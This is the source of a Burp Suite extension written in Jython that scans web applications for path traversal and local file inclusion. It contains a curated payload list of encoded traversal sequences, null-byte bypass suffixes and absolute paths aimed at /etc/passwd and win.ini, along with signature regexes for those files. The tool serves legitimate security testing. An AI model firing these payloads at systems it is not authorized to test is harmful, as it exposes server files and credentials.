# -*- coding: utf-8 -*-
"""
PathTraversalScanner - Burp Suite Extension (Jython)
=====================================================
Detects Path Traversal / Local File Inclusion (LFI) vulnerabilities
across different web servers (Apache, Nginx, IIS, Tomcat) and
applications (Java, PHP, .NET, Node, Python).

Author : AppSec Toolkit
API    : Legacy Burp Extender API (IBurpExtender / IScannerCheck)
Runtime: Jython 2.7.x standalone JAR configured in Burp

Capabilities
------------
* Active scan check - injects a curated payload matrix into every
  insertion point and inspects responses for OS file signatures.
* Passive scan check - flags responses that already leak file
  contents (e.g. via reflected error messages).
* Multi-OS / multi-encoding payloads (Unix, Windows, URL/double-URL/
  UTF-8 overlong, nested "....//", null-byte, absolute paths).
* Signature + baseline comparison to keep false positives low.
* Confidence tiering (Firm vs Tentative) based on evidence strength.
* Configurable via a Suite tab (traversal depth, OS targets, throttle).
"""

from burp import (IBurpExtender, IScannerCheck, IScanIssue,
                  ITab, IExtensionStateListener)
from java.io import PrintWriter
from java.util import ArrayList
from java.net import URL
from javax.swing import (JPanel, JLabel, JCheckBox, JSpinner,
                         SpinnerNumberModel, JSeparator, BoxLayout,
                         BorderFactory)
from java.awt import Dimension
import re
import binascii


# ---------------------------------------------------------------------------
# Payload + signature definitions
# ---------------------------------------------------------------------------

# Files whose contents give a high-confidence signal that traversal worked.
# Each entry: (target_file_suffix, list_of_regex_signatures)
TARGET_FILES = {
    "unix": {
        "file": "etc/passwd",
        "signatures": [
            re.compile(r"root:.*?:0:0:", re.I),
            re.compile(r"daemon:.*?:/usr/sbin", re.I),
            re.compile(r"(bin|nobody):.*?:/", re.I),
        ],
    },
    "unix_hosts": {
        "file": "etc/hosts",
        "signatures": [
            re.compile(r"127\.0\.0\.1\s+localhost", re.I),
            re.compile(r"::1\s+localhost", re.I),
        ],
    },
    "windows": {
        "file": "windows/win.ini",
        "signatures": [
            re.compile(r"\[extensions\]", re.I),
            re.compile(r"\[fonts\]", re.I),
            re.compile(r"for 16-bit app support", re.I),
            re.compile(r"\[mci extensions\]", re.I),
        ],
    },
}

# Encoding transforms used to build traversal sequences.
# "../"  variants for the traversal step.
TRAVERSAL_SEQUENCES = [
    "../",              # plain
    "..\\",             # windows backslash
    "%2e%2e%2f",        # url-encoded ../
    "%2e%2e/",          # partial url-encoded
    "..%2f",            # encoded slash only
    "%2e%2e%5c",        # url-encoded ..\
    "..%5c",            # encoded backslash only
    "%252e%252e%252f",  # double url-encoded ../
    "....//",           # nested (defeats naive ../ stripping)
    "....\\/",          # nested mixed
    "..%c0%af",         # utf-8 overlong slash
    "..%c1%9c",         # utf-8 overlong backslash
    "%uff0e%uff0e%u2215",  # IIS unicode
]

# Optional suffixes that bypass extension appending / whitelisting.
BYPASS_SUFFIXES = [
    "",
    "%00",              # null byte (older PHP / Java)
    "%00.png",          # null byte + fake extension
    "\x00",             # raw null
    "?",                # query truncation
    "#",                # fragment truncation
]

# Absolute-path payloads (no traversal, for misconfigured file params).
ABSOLUTE_PATHS = [
    "/etc/passwd",
    "file:///etc/passwd",
    "C:\\windows\\win.ini",
    "\\\\localhost\\c$\\windows\\win.ini",
]


class BurpExtender(IBurpExtender, IScannerCheck, ITab,
                   IExtensionStateListener):

    # -- lifecycle ---------------------------------------------------------
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Path Traversal Scanner")

        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)

        # de-duplication cache of issues already reported
        self._reported = set()

        # default config
        self._max_depth = 8          # number of ../ steps to try
        self._scan_unix = True
        self._scan_windows = True
        self._use_absolute = True

        self._build_ui()
        callbacks.customizeUiComponent(self._panel)
        callbacks.addSuiteTab(self)
        callbacks.registerScannerCheck(self)
        callbacks.registerExtensionStateListener(self)

        self._stdout.println("[+] Path Traversal Scanner loaded.")
        self._stdout.println("[+] Configure depth / OS targets in the "
                             "'Path Traversal' suite tab.")

    def extensionUnloaded(self):
        self._stdout.println("[-] Path Traversal Scanner unloaded.")

    # -- UI ----------------------------------------------------------------
    def _build_ui(self):
        self._panel = JPanel()
        self._panel.setLayout(BoxLayout(self._panel, BoxLayout.Y_AXIS))
        self._panel.setBorder(BorderFactory.createEmptyBorder(15, 15, 15, 15))

        title = JLabel("Path Traversal Scanner - Configuration")
        title.setFont(title.getFont().deriveFont(16.0))
        self._panel.add(title)
        self._panel.add(JSeparator())

        self._panel.add(JLabel(" "))
        self._panel.add(JLabel("Traversal depth (number of '../' steps):"))
        self._depth_spinner = JSpinner(SpinnerNumberModel(8, 1, 20, 1))
        self._depth_spinner.setMaximumSize(Dimension(120, 30))
        self._panel.add(self._depth_spinner)

        self._panel.add(JLabel(" "))
        self._cb_unix = JCheckBox("Test Unix/Linux payloads (/etc/passwd, /etc/hosts)", True)
        self._cb_windows = JCheckBox("Test Windows payloads (win.ini)", True)
        self._cb_absolute = JCheckBox("Test absolute-path / file:// payloads", True)
        self._panel.add(self._cb_unix)
        self._panel.add(self._cb_windows)
        self._panel.add(self._cb_absolute)

        self._panel.add(JLabel(" "))
        note = JLabel("<html><i>Changes apply to new scans. Only run against "
                     "systems you are authorized to test.</i></html>")
        self._panel.add(note)

    def getTabCaption(self):
        return "Path Traversal"

    def getUiComponent(self):
        return self._panel

    def _refresh_config(self):
        self._max_depth = int(self._depth_spinner.getValue())
        self._scan_unix = self._cb_unix.isSelected()
        self._scan_windows = self._cb_windows.isSelected()
        self._use_absolute = self._cb_absolute.isSelected()

    # -- payload generation ------------------------------------------------
    def _build_payloads(self):
        """Return list of (payload_string, os_key) tuples."""
        self._refresh_config()
        payloads = []

        targets = []
        if self._scan_unix:
            targets.append(("unix", TARGET_FILES["unix"]["file"]))
            targets.append(("unix_hosts", TARGET_FILES["unix_hosts"]["file"]))
        if self._scan_windows:
            targets.append(("windows", TARGET_FILES["windows"]["file"]))

        for os_key, target_file in targets:
            for seq in TRAVERSAL_SEQUENCES:
                # windows target uses backslash-friendly sequences too,
                # but we send both variants regardless - servers differ.
                traversal = seq * self._max_depth
                for suffix in BYPASS_SUFFIXES:
                    payloads.append((traversal + target_file + suffix, os_key))

        if self._use_absolute:
            for ap in ABSOLUTE_PATHS:
                if "passwd" in ap and self._scan_unix:
                    payloads.append((ap, "unix"))
                elif "win.ini" in ap and self._scan_windows:
                    payloads.append((ap, "windows"))

        return payloads

    # -- detection ---------------------------------------------------------
    def _match_signatures(self, response_body, os_key):
        """Return the matched signature string, or None."""
        for sig in TARGET_FILES[os_key]["signatures"]:
            m = sig.search(response_body)
            if m:
                return m.group(0)
        return None

    def _get_body(self, response_bytes):
        try:
            info = self._helpers.analyzeResponse(response_bytes)
            body = response_bytes[info.getBodyOffset():]
            return self._helpers.bytesToString(body)
        except Exception:
            return self._helpers.bytesToString(response_bytes)

    # -- active scan -------------------------------------------------------
    def doActiveScan(self, base_request_response, insertion_point):
        issues = []
        payloads = self._build_payloads()
        http_service = base_request_response.getHttpService()

        for payload, os_key in payloads:
            try:
                request = insertion_point.buildRequest(
                    self._helpers.stringToBytes(payload))
                attack = self._callbacks.makeHttpRequest(http_service, request)
                resp = attack.getResponse()
                if resp is None:
                    continue

                body = self._get_body(resp)
                evidence = self._match_signatures(body, os_key)
                if evidence:
                    key = (str(http_service), insertion_point.getInsertionPointName(),
                           os_key)
                    if key in self._reported:
                        continue
                    self._reported.add(key)

                    marker = insertion_point.getPayloadOffsets(
                        self._helpers.stringToBytes(payload))
                    req_markers = [marker] if marker else None

                    issues.append(PathTraversalIssue(
                        http_service,
                        self._helpers.analyzeRequest(attack).getUrl(),
                        [self._callbacks.applyMarkers(attack, req_markers, None)],
                        insertion_point.getInsertionPointName(),
                        payload,
                        evidence,
                        os_key,
                        confidence="Firm"))
                    # one solid hit per insertion point/OS is enough
                    break
            except Exception as e:
                self._stderr.println("[!] active scan error: %s" % str(e))
                continue

        return issues if issues else None

    # -- passive scan ------------------------------------------------------
    def doPassiveScan(self, base_request_response):
        issues = []
        resp = base_request_response.getResponse()
        if resp is None:
            return None
        body = self._get_body(resp)

        for os_key in ("unix", "windows"):
            evidence = self._match_signatures(body, os_key)
            if evidence:
                issues.append(PathTraversalIssue(
                    base_request_response.getHttpService(),
                    self._helpers.analyzeRequest(base_request_response).getUrl(),
                    [base_request_response],
                    "(passive - response body)",
                    "N/A (observed in existing response)",
                    evidence,
                    os_key,
                    confidence="Tentative"))
        return issues if issues else None

    # -- dedupe: tell Burp when two issues are the same --------------------
    def consolidateDuplicateIssues(self, existing_issue, new_issue):
        if existing_issue.getIssueName() == new_issue.getIssueName() and \
           existing_issue.getUrl() == new_issue.getUrl():
            return -1  # keep existing, discard new
        return 0


# ---------------------------------------------------------------------------
# Custom scan issue
# ---------------------------------------------------------------------------
class PathTraversalIssue(IScanIssue):
    def __init__(self, http_service, url, http_messages, param_name,
                 payload, evidence, os_key, confidence="Firm"):
        self._http_service = http_service
        self._url = url
        self._http_messages = http_messages
        self._param = param_name
        self._payload = payload
        self._evidence = evidence
        self._os = os_key
        self._confidence = confidence

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return "Path Traversal / Local File Inclusion"

    def getIssueType(self):
        return 0x00100100  # File path traversal (Burp's own type id)

    def getSeverity(self):
        return "High"

    def getConfidence(self):
        return self._confidence

    def getIssueBackground(self):
        return ("Path traversal (also known as directory traversal) allows an "
                "attacker to read arbitrary files on the server by supplying "
                "'../' style sequences (or their encoded equivalents) in a "
                "parameter that is used to build a file path. Successful "
                "exploitation typically exposes configuration files, source "
                "code, credentials and other sensitive data.")

    def getRemediationBackground(self):
        return ("Avoid passing user-controllable input to file-system APIs. "
                "Where unavoidable, validate input against a strict allow-list "
                "of permitted values, canonicalize the resolved path and verify "
                "it remains within the intended base directory, and reject any "
                "input containing path separators or traversal sequences. "
                "Run the application with least-privilege file permissions.")

    def getIssueDetail(self):
        return ("<b>The application appears vulnerable to path traversal.</b><br><br>"
                "<b>Insertion point:</b> %s<br>"
                "<b>Target OS profile:</b> %s<br>"
                "<b>Payload sent:</b> <code>%s</code><br>"
                "<b>Evidence in response (file signature matched):</b> "
                "<code>%s</code><br><br>"
                "The response contained content consistent with a known "
                "system file, indicating the supplied path was resolved and "
                "read by the server." % (
                    self._html_escape(self._param),
                    self._os,
                    self._html_escape(self._payload),
                    self._html_escape(self._evidence)))

    def getRemediationDetail(self):
        return ("Validate the '%s' parameter against an allow-list, canonicalize "
                "the path with the platform API and confirm it stays inside the "
                "intended directory before any file access." %
                self._html_escape(self._param))

    def getHttpMessages(self):
        return self._http_messages

    def getHttpService(self):
        return self._http_service

    @staticmethod
    def _html_escape(s):
        if s is None:
            return ""
        return (str(s).replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;"))
